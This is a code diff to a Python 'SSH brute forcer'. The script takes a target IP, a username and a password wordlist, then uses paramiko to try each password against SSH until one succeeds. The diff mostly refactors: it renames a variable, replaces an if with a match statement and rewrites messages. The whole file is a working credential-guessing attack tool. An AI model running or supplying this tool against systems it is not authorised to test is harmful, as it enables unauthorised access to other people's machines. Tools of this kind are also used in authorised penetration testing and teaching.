@@ -3,11 +3,11 @@ import paramiko, sys, os, socket, termcolor, argparse
 
 def ssh_connect(username: str, password: str, host: str, code: int =0) -> int:
     """Returns response code (int) 0:success, 1:authError, 2:connectionError"""
-    SSH_conn = paramiko.SSHClient()
-    SSH_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try :
         # port 22 is set default in paramiko, declared explicitly for clarity
-        SSH_conn.connect(hostname=host, port=22, username=username, password=password)
+        ssh_client.connect(hostname=host, port=22, username=username, password=password)
     except paramiko.AuthenticationException:
         code = 1
         termcolor.cprint(f'[!] Password: {password} incorrect for user: {username} ','red')
@@ -15,7 +15,7 @@ def ssh_connect(username: str, password: str, host: str, code: int =0) -> int:
         code = 2
         termcolor.cprint(e, "red")
 
-    SSH_conn.close()
+    ssh_client.close()
     return code
 
 
@@ -33,14 +33,18 @@ def main(arguments):
                 password = line.strip("\n")
                 termcolor.cprint(f'[*] Attempting to connect to {username}@{host} with password: {password}', "yellow")
                 response = ssh_connect(username, password, host)
-                if response == 0:
-                    termcolor.cprint(f'[+] Correct password found: {password} for user {username}', 'green')
-                    # on success break loop, no need to keep trying
-                    break
+                match response:
+                    case 0:
+                        termcolor.cprint(f'[+] Correct password found: {password} for user {username}', 'green')
+                        # on success break loop, no need to keep trying
+                        break
+                    case 1:
+                        termcolor.cprint(f'[-] Credentials {username}:{password} incorrect', 'yellow')
+                    case 2:
+                        termcolor.cprint((f'[!] Cannot connect to socket', 'red'))
 
 
 def get_arguments():
-
     parser = argparse.ArgumentParser(prog='SSH brute forcer')
     parser.add_argument('-t', dest='target_ip', help='IP of the desired target', required=True)
     parser.add_argument('-u', dest='username', help='Username on target', required=True)
@@ -62,7 +66,7 @@ if __name__ == "__main__":
         cli_args = get_arguments()
         main(cli_args)
     except:
-        termcolor.cprint("[!] One or more arguments have not being introduced", "red", "on_black")
+        termcolor.cprint("[!] Something went wrong, exiting...", "red")
 
 
 
